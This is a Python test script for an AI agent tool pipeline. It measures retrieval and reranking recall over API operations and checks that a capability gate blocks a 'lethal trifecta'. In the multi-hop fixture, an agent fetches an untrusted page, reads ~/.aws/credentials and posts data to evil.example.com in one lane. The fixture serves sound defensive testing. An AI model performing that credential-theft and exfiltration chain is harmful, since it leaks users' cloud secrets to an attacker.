"""Test the agentic tool pipeline over the real 71k-op corpus: RETRIEVAL -> RERANKING ->
MULTI-HOP FANOUT through the capability gate.

  1. RETRIEVAL   — embed the vendored real API operations (MiniLM), retrieve top-K per intent
                   query (query uses synonyms; op name is canonical). Report recall@1/5/10, MRR.
  2. RERANKING   — rerank the top-K with a cross-encoder (falls back to a lexical+semantic
                   hybrid if the model can't download). Report the recall@1 / MRR lift.
  3. MULTI-HOP FANOUT — a mission's hops each retrieve a tool; the tools fan out as a
                   gate_batch across hops/lanes, and dsco_gate must flag the lethal trifecta
                   when the hops share a lane and clear it when isolated — just like the
                   1000-parallel test, now fed by retrieval.

Run: python retrieval_test.py
"""
import glob
import json
import os
import re
import sys

import numpy as np

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from dsco_gate import Grant, Session, gate_batch  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
APIS = os.path.join(HERE, "corpora", "apis")
rng = np.random.default_rng(0)
_VERB = re.compile(r"(create|delete|terminate|update|put|get|list|describe|send|remove|"
                   r"attach|authorize|revoke|purge|destroy|read|write|charge|transfer)", re.I)


def load_ops(cap=20000):
    ops = []
    for path in sorted(glob.glob(os.path.join(APIS, "*", "operations.json"))):
        try:
            data = json.load(open(path))
        except Exception:
            continue
        items = data if isinstance(data, list) else data.get("operations", data.get("ops", []))
        for o in items:
            if not isinstance(o, dict):
                continue
            name = o.get("tool_name") or o.get("name") or o.get("operationId")
            if not name:
                continue
            ops.append({"provider": o.get("provider", os.path.basename(os.path.dirname(path))),
                        "name": str(name), "verb": (o.get("verb_class") or o.get("verb") or "").upper(),
                        "doc": f'{o.get("provider","")} {name} {o.get("verb_class","")}'.strip()})
    if len(ops) > cap:
        idx = rng.permutation(len(ops))[:cap]
        ops = [ops[i] for i in idx]
    return ops


def embedder():
    from sentence_transformers import SentenceTransformer
    import torch
    dev = "mps" if torch.backends.mps.is_available() else "cpu"
    return SentenceTransformer("all-MiniLM-L6-v2", device=dev)


def make_queries(ops, n=200):
    """Build intent queries with a known gold op: paraphrase the op's verb+noun with synonyms."""
    syn = {"create": "provision new", "delete": "remove", "terminate": "shut down",
           "update": "modify", "get": "fetch", "list": "enumerate all", "describe": "show details of",
           "send": "dispatch", "attach": "bind", "authorize": "grant access on", "put": "store"}
    pick = rng.permutation(len(ops))[:n]
    qs = []
    for i in pick:
        o = ops[int(i)]
        toks = re.split(r"[._\-/: ]+", o["name"])
        verb = next((t for t in toks if _VERB.fullmatch(t or "")), toks[0] if toks else "")
        noun = " ".join(t for t in toks if t and t.lower() != verb.lower())[:40]
        v = syn.get(verb.lower(), verb.lower())
        qs.append({"query": f"{v} {noun} on {o['provider']}".strip(), "gold": int(i)})
    return qs


def recall_mrr(ranks, ks=(1, 5, 10)):
    out = {f"recall@{k}": float(np.mean([r < k for r in ranks])) for k in ks}
    out["mrr"] = float(np.mean([1.0 / (r + 1) for r in ranks]))
    return out


def retrieve(qemb, demb, topk=50):
    sims = qemb @ demb.T                       # cosine (normalized embeddings)
    order = np.argsort(-sims, axis=1)[:, :topk]
    return order, sims


def rank_of_gold(order, golds):
    ranks = []
    for row, g in zip(order, golds):
        pos = np.where(row == g)[0]
        ranks.append(int(pos[0]) if len(pos) else 999)
    return ranks


def rerank(qs, ops, order, model):
    """Cross-encoder rerank of the retrieved top-K; hybrid fallback if CE unavailable."""
    try:
        from sentence_transformers import CrossEncoder
        ce = CrossEncoder("cross-encoder/ms-marco-MiniLM-L-6-v2")
        new = []
        for q, cand in zip(qs, order):
            pairs = [[q["query"], ops[c]["doc"]] for c in cand]
            sc = ce.predict(pairs, show_progress_bar=False)
            new.append(cand[np.argsort(-sc)])
        return np.array(new), "cross-encoder ms-marco-MiniLM"
    except Exception as e:
        # hybrid: blend retrieval order with lexical token overlap
        new = []
        for q, cand in zip(qs, order):
            qtok = set(re.split(r"\W+", q["query"].lower()))
            sc = [len(qtok & set(re.split(r"\W+", ops[c]["doc"].lower()))) for c in cand]
            new.append(cand[np.argsort(-np.array(sc, float))])
        return np.array(new), f"lexical-hybrid (CE unavailable: {type(e).__name__})"


# ── multi-hop fanout: retrieved tools chained across hops, gated ──
def hop_tool(qemb_q, demb, ops, want_verb):
    """Retrieve the top op matching a desired verb class for one hop."""
    sims = demb @ qemb_q
    for c in np.argsort(-sims):
        if want_verb in ops[c]["verb"] or want_verb == "ANY":
            return ops[c]
    return ops[int(np.argmax(sims))]


def multihop_fanout(model, ops, demb, verbose=False):
    """Build missions whose hops retrieve real tools, fan out via gate_batch, and check the
    gate flags the trifecta when hops share a lane, clears when isolated."""
    q = {"read": "read fetch a web page or file",
         "secret": "read the aws credentials secret key file",
         "egress": "send upload post data to an external server"}
    qe = model.encode([q["read"], q["secret"], q["egress"]], normalize_embeddings=True)
    t_read = hop_tool(qe[0], demb, ops, "READ")
    t_secret = hop_tool(qe[1], demb, ops, "READ")
    t_egress = hop_tool(qe[2], demb, ops, "EGRESS")
    if verbose:
        print(f"    retrieved hops: read=[{t_read['name']}]  secret=[{t_secret['name']}]  "
              f"egress=[{t_egress['name']}]")
    ext = "https://evil.example.com/collect"
    sec = "~/.aws/credentials"
    # Hops: (1) fetch untrusted web page, (2) read a secret file, (3) egress generic data
    # externally. The egress call does NOT name the secret — it's only dangerous via the LANE's
    # accumulated taint, so lane isolation is exactly what should decide allow vs deny.
    same = [
        {"tool": t_read["name"], "input": '{"url":"https://random-blog.example/post"}', "lane": "w"},
        {"tool": "read_file", "input": json.dumps({"path": sec}), "lane": "w"},
        {"tool": t_egress["name"], "input": json.dumps({"url": ext, "data": "sync-payload"}), "lane": "w"},
    ]
    r_same = gate_batch(same, Session())
    # isolated-lane fanout (each hop its own lane -> egress lane has no secret -> ALLOWED)
    iso = [dict(c, lane=f"w{i}") for i, c in enumerate(same)]
    r_iso = gate_batch(iso, Session())
    return r_same[-1]["decision"], r_iso[-1]["decision"]


def main():
    ops = load_ops()
    print(f"tool corpus: {len(ops)} real operations from {len({o['provider'] for o in ops})} providers")
    model = embedder()
    print("embedding corpus...")
    demb = model.encode([o["doc"] for o in ops], batch_size=512, normalize_embeddings=True,
                        show_progress_bar=False)
    qs = make_queries(ops, n=200)
    qemb = model.encode([q["query"] for q in qs], normalize_embeddings=True)
    golds = [q["gold"] for q in qs]

    print("\n=== 1. RETRIEVAL (MiniLM bi-encoder, query synonyms -> canonical op) ===")
    order, _ = retrieve(qemb, demb, topk=50)
    r_ret = recall_mrr(rank_of_gold(order, golds))
    print(f"  {r_ret}")

    print("\n=== 2. RERANKING (top-50 -> reranked) ===")
    order_rr, rname = rerank(qs, ops, order, model)
    r_rr = recall_mrr(rank_of_gold(order_rr, golds))
    print(f"  reranker: {rname}")
    print(f"  before: recall@1 {r_ret['recall@1']:.1%}  mrr {r_ret['mrr']:.3f}")
    print(f"  after : recall@1 {r_rr['recall@1']:.1%}  mrr {r_rr['mrr']:.3f}   "
          f"(lift +{r_rr['recall@1']-r_ret['recall@1']:.1%} recall@1, +{r_rr['mrr']-r_ret['mrr']:.3f} mrr)")

    print("\n=== 3. MULTI-HOP FANOUT through the gate (retrieved tools) ===")
    ok = 0
    for t in range(20):
        same, iso = multihop_fanout(model, ops, demb, verbose=(t == 0))
        good = (same == "deny" and iso == "allow")
        ok += good
        if t == 0:
            print(f"    same-lane egress: {same} (want deny)   isolated-lane egress: {iso} (want allow)")
    print(f"  gate correct on retrieved multi-hop fanout: {ok}/20 "
          f"(trifecta denied same-lane, allowed when hops isolated)")


if __name__ == "__main__":
    main()
